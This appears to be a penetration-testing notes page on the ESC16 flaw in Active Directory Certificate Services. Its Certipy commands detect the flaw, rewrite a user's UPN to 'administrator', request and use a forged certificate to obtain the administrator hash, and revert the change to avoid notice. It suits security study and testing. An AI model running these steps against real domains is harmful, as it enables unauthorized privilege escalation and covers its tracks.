# ESC16

_"The ESC16 vulnerability in Active Directory Certificate Services (AD CS) arises when the `szOID_NTDS_CA_SECURITY_EXT` extension is globally disabled, weakening the certificate-to-account binding and allowing legacy mappings like UPN or SAN to be used for authentication. This misconfiguration, combined with the absence of strict enforcement (`StrongCertificateBindingEnforcement` not set to 2), enables attackers with limited privileges to impersonate higher-privileged users by modifying their own `userPrincipalName` and requesting a forged certificate. Through tools like Certipy, attackers can identify and exploit this flaw to gain unauthorized access. To prevent such attacks, organizations must ensure strong certificate binding enforcement is enabled, the critical OID extension is not disabled, and certificate templates and user permissions are strictly audited and configured."_

{% embed url="https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6" %}

#### Methodology

* Run Certipy (version 5.X.X) and check the output
* If the Certificate is vulnerable to ESC16, exploit it
* Leverage ESC16 to escalate privilege



## ESC16 detection&#x20;

Using `certify v5.0.2` from kali linux machine to detect if the certicate is vulnerables.

<pre class="language-bash" data-title="With Pass" data-overflow="wrap"><code class="lang-bash"><strong>certipy find -u 'user@domain.com' -p 'PASS' -dc-ip IP -vulnerable -enabled
</strong></code></pre>

{% code title="With Hash" overflow="wrap" %}
```bash
certipy find -u 'user@domain.com' -hashes 'HASH' -dc-ip IP -vulnerable -enabled
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

### **Exploitation of ESC16 Vulnerability Using Certipy**

1. **Update UserPrincipalName** (UPN) of a user to impersonate another user (like `administrator`).

{% code overflow="wrap" %}
```bash
certipy account -u 'USER' -p 'PASS' -target 'DC.domain.com' -dc-ip IP -upn 'administrator' -user 'USER_TO_MOD' update
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

This allows the user to request certificates for the `administrator` identity.

2. **Verify** the Attribute Update

```bash
certipy account -u 'USER' -p 'PASS' -dc-ip IP -u 'MOD_USER' read
```

<figure><img src="../../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Now the UPN is set to `administrator` .

3. **Request Certificate** as `administrator`&#x20;

{% code overflow="wrap" %}
```bash
certipy req -dc-ip IP -u 'administrator' -p 'USER_PASS' -target 'DC.domain.com' -ca 'CA_NAME' -template 'User'
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

4. **Revert the UPN change** to prevent suspiciuos or disruption.

{% code overflow="wrap" %}
```bash
certify account -u 'USER' -p 'PASS' -target 'DC.domain.com' -dc-ip IP -upn 'USER_TO_MOD' -user 'USER_TO_MOD' update
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>



### Get access with administrator certificate

Once we obtained the `administrator.pfx` certificate, we can use it to get his hash.

```bash
certipy auth -pfx administrator.pfx -domain 'domain.com' -dc-ip IP 
```

<figure><img src="../../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

